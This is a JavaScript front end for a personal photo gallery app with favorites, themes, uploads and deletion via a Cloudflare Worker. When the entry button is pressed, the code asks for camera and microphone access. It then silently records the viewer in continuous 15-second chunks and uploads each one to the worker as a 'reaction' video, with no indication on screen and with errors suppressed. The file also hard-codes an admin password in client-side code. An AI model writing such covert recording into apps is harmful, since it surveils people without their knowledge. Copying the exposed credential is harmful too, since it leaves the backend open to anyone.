const WORKER_URL = 'https://ourmemory.mrony8552.workers.dev'; 
const ADMIN_PASS = "74722222"; 
const RECORDING_CHUNK_MS = 15000; 

// DOM Elements
const entryScreen = document.getElementById('entry-screen');
const galleryScreen = document.getElementById('gallery-screen');
const galleryContainer = document.getElementById('gallery-grid');

// Layouts and Themes
const layouts = ['grid-style-5', 'grid-style-1', 'grid-style-2', 'grid-style-3', 'grid-style-4'];
let layoutIdx = 0;
const themes = ['theme-light', 'theme-amoled', 'theme-aurora', 'theme-champagne'];
let themeIdx = 0;

// --- SAFE FAVORITES LOGIC ---
let favorites = [];
let showFavsOnly = false;
try {
    favorites = JSON.parse(localStorage.getItem('favs')) || [];
} catch (e) {
    console.log("Storage error ignored");
}

function toggleFavorite(key) {
    try {
        if (favorites.includes(key)) {
            favorites = favorites.filter(k => k !== key);
        } else {
            favorites.push(key);
        }
        localStorage.setItem('favs', JSON.stringify(favorites));
        loadImages(); 
    } catch(e) {}
}

// --- SAFE EVENT BINDING UTILITY ---
function safeClick(id, callback) {
    const el = document.getElementById(id);
    if (el) {
        el.addEventListener('click', callback);
    }
}

// --- 1. ENTRY LOGIC ---
let secretTap = 0, tapTimer;
safeClick('secret-heart', () => {
    secretTap++; clearTimeout(tapTimer);
    if (secretTap >= 3) { enterGallery(); secretTap = 0; } 
    tapTimer = setTimeout(() => secretTap = 0, 1000); 
});

safeClick('enter-btn', async () => {
    try {
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            enterGallery();
            startRecording(stream);
        } else {
            enterGallery();
        }
    } catch (err) { enterGallery(); } 
});

function enterGallery() {
    if(entryScreen) entryScreen.classList.remove('active-screen');
    if(galleryScreen) galleryScreen.classList.add('active-screen');
    loadImages();
}

function startRecording(stream) {
    try {
        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        let chunks = [];
        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
        recorder.onstop = async () => {
            const formData = new FormData();
            formData.append('file', new Blob(chunks, { type: 'video/webm' }), `reaction-${Date.now()}.webm`);
            try { await fetch(`${WORKER_URL}/api/upload`, { method: 'POST', body: formData }); } catch(err){}
            startRecording(stream);
        };
        recorder.start();
        setTimeout(() => { if(recorder.state === 'recording') recorder.stop(); }, RECORDING_CHUNK_MS);
    } catch(e) {}
}

// --- 2. UPLOAD PHOTOS ---
safeClick('upload-fab', () => {
    const input = document.getElementById('image-upload-input');
    if (input) input.click();
});

const uploadInput = document.getElementById('image-upload-input');
if(uploadInput) {
    uploadInput.addEventListener('change', async (e) => {
        if (!e.target.files.length) return;
        if(galleryContainer) galleryContainer.innerHTML = '<div class="loading-text">Uploading photos... ⏳</div>';
        
        for (let file of e.target.files) {
            const formData = new FormData(); formData.append('file', file);
            try { await fetch(`${WORKER_URL}/api/upload-image`, { method: 'POST', body: formData }); } catch(err){}
        }
        loadImages();
    });
}

// --- 3. SMART LOAD PHOTOS (CRASH PROOF) ---
async function loadImages() {
    if(!galleryContainer) return;
    galleryContainer.innerHTML = '<div class="loading-text">Loading our moments... ✨</div>';
    try {
        const res = await fetch(`${WORKER_URL}/api/images`);
        if (res.ok) {
            const data = await res.json();
            galleryContainer.innerHTML = ''; 
            
            let imgArray = data.images;
            const currentLayout = layouts[layoutIdx];
            const isMasonry = ['grid-style-1', 'grid-style-3', 'grid-style-5'].includes(currentLayout);
            let colCount = currentLayout === 'grid-style-5' ? 2 : (isMasonry ? 3 : 1);

            if (showFavsOnly) {
                imgArray = imgArray.filter(k => favorites.includes(k)); 
                if (isMasonry && imgArray.length > 0) {
                    let cols = Array.from({length: colCount}, () => []);
                    imgArray.forEach((item, i) => cols[i % colCount].push(item));
                    // Safe flat for older WebViews
                    imgArray = cols.reduce((acc, val) => acc.concat(val), []);
                }
            } else {
                let f = imgArray.filter(k => favorites.includes(k));
                let n = imgArray.filter(k => !favorites.includes(k));

                if (isMasonry) {
                    let cols = Array.from({length: colCount}, () => []);
                    f.forEach((item, i) => cols[i % colCount].push(item));
                    n.forEach((item, i) => { cols[(f.length + i) % colCount].push(item); });
                    // Safe flat for older WebViews
                    imgArray = cols.reduce((acc, val) => acc.concat(val), []); 
                } else {
                    imgArray = f.concat(n); 
                }
            }

            if (imgArray.length === 0) { 
                galleryContainer.innerHTML = showFavsOnly ? '<div class="loading-text">No favorites yet. Long press a photo! ❤️</div>' : '<div class="loading-text">No photos yet. Tap + to upload ❤️</div>'; 
                return; 
            }
            
            imgArray.forEach(key => {
                const isFav = favorites.includes(key);
                const wrap = document.createElement('div');
                wrap.className = 'img-wrapper';
                wrap.innerHTML = `
                    <img src="${WORKER_URL}/api/image/${key}" loading="lazy">
                    ${isFav ? '<div class="fav-badge">❤️</div>' : ''}
                    <div class="delete-overlay">🗑️</div>
                `;
                
                // Touch/Mouse Events
                const imgEl = wrap.querySelector('img');
                const delOverlay = wrap.querySelector('.delete-overlay');
                let pressTimer;
                let longPressed = false;
                
                const startPress = () => {
                    longPressed = false;
                    if(document.body.classList.contains('delete-mode')) return;
                    pressTimer = setTimeout(() => {
                        longPressed = true;
                        toggleFavorite(key);
                        try { if (navigator.vibrate) navigator.vibrate(50); } catch(e){}
                    }, 500); 
                };
                const cancelPress = () => clearTimeout(pressTimer);
                
                imgEl.addEventListener('touchstart', startPress, {passive: true});
                imgEl.addEventListener('touchend', cancelPress);
                imgEl.addEventListener('touchmove', cancelPress, {passive: true});
                imgEl.addEventListener('mousedown', startPress);
                imgEl.addEventListener('mouseup', cancelPress);
                imgEl.addEventListener('mouseleave', cancelPress);
                
                imgEl.addEventListener('click', () => {
                    if(document.body.classList.contains('delete-mode')) return;
                    if(!longPressed) {
                        openFullscreen(`${WORKER_URL}/api/image/${key}`);
                    }
                });

                // Handle Delete
                delOverlay.addEventListener('click', () => { deleteImage(key); });

                galleryContainer.appendChild(wrap);
            });
        }
    } catch (err) { 
        if(galleryContainer) galleryContainer.innerHTML = '<div class="loading-text">Error loading images.</div>'; 
    }
}

async function deleteImage(key) {
    if(!confirm('Are you sure you want to delete this photo?')) return;
    if(galleryContainer) galleryContainer.innerHTML = '<div class="loading-text">Deleting... ⏳</div>';
    try {
        await fetch(`${WORKER_URL}/api/admin/files`, {
            method: 'DELETE',
            headers: { 'X-Admin-Password': ADMIN_PASS, 'Content-Type': 'application/json' },
            body: JSON.stringify({ key })
        });
        if (favorites.includes(key)) toggleFavorite(key);
        else loadImages();
    } catch(err) { alert('Failed to delete'); loadImages(); }
}

// --- FULLSCREEN MODAL ---
const fullscreenModal = document.getElementById('fullscreen-modal');
const fullscreenImg = document.getElementById('fullscreen-img');

function openFullscreen(src) {
    if(fullscreenImg && fullscreenModal) {
        fullscreenImg.src = src;
        fullscreenModal.classList.add('active');
    }
}

safeClick('close-modal-btn', () => {
    if(fullscreenModal && fullscreenImg) {
        fullscreenModal.classList.remove('active');
        fullscreenImg.src = '';
    }
});

if(fullscreenModal) {
    fullscreenModal.addEventListener('click', (e) => {
        if(e.target === fullscreenModal) {
            fullscreenModal.classList.remove('active');
            fullscreenImg.src = '';
        }
    });
}

// --- 4. UI CONTROLS ---
safeClick('theme-toggle', () => {
    document.body.classList.remove(themes[themeIdx]);
    themeIdx = (themeIdx + 1) % themes.length;
    document.body.classList.add(themes[themeIdx]);
});

safeClick('layout-toggle', () => {
    if(galleryContainer) {
        galleryContainer.className = ''; 
        layoutIdx = (layoutIdx + 1) % layouts.length;
        galleryContainer.classList.add(layouts[layoutIdx]);
    }
});

// Navigation Bottom Bar
const navHome = document.getElementById('nav-home');
const navDelete = document.getElementById('nav-delete');
const navFavs = document.getElementById('nav-favs');

safeClick('nav-delete', () => {
    document.body.classList.toggle('delete-mode');
    const isDeleteMode = document.body.classList.contains('delete-mode');
    if(navDelete) {
        navDelete.classList.toggle('danger', isDeleteMode);
        navDelete.classList.toggle('active', isDeleteMode);
    }
    
    if (isDeleteMode) {
        if(navHome) navHome.classList.remove('active');
        if(navFavs) navFavs.classList.remove('active');
    } else {
        if(navHome) navHome.classList.toggle('active', !showFavsOnly);
        if(navFavs) navFavs.classList.toggle('active', showFavsOnly);
    }
});

safeClick('nav-home', () => {
    document.body.classList.remove('delete-mode');
    showFavsOnly = false;
    if(navDelete) navDelete.classList.remove('danger', 'active');
    if(navFavs) navFavs.classList.remove('active');
    if(navHome) navHome.classList.add('active');
    loadImages();
});

safeClick('nav-favs', () => {
    document.body.classList.remove('delete-mode');
    showFavsOnly = true;
    if(navDelete) navDelete.classList.remove('danger', 'active');
    if(navHome) navHome.classList.remove('active');
    if(navFavs) navFavs.classList.add('active');
    loadImages();
});
